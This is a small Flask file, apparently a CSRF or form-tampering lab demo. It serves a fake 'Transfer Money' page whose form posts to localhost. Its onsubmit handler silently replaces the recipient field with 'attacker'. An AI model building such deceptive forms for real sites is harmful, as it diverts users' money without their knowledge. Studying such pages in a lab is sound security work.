from flask import Flask, render_template, request, make_response, redirect

app = Flask(__name__)

html = b"""
<html><body>
<h1>Transfer Money<img src=https://www.flaticon.com/svg/static/icons/svg/3716/3716811.svg>
<form method='post' action='http://localhost:5000/transfer' onsubmit=document.getElementById('to').value="attacker"><p>
Amount:<input name='amount'><p>
To:<input name='to' id='to'>
<input type=submit>
</form>
</body></html>
"""

@app.route('/transfer', methods=['GET'])
def csrf():
    return html
